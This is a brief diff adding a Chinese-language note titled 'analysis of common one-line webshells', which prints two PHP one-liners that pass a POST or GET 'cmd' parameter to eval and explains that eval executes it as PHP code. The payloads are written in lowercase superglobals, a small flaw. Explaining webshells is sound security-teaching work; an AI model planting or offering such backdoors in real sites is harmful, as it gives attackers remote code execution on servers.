@@ -1,0 +1,4 @@
+常用的一句话webshell解析
+1、<?php eval($_post[cmd])?> 将cmd参数直接执行；
+   <?php eval($_get[cmd])?> 将cmd参数直接执行；
+   在PHP脚本语言中，eval（code）的功能是将code组合成php指令，然后将指令执行。
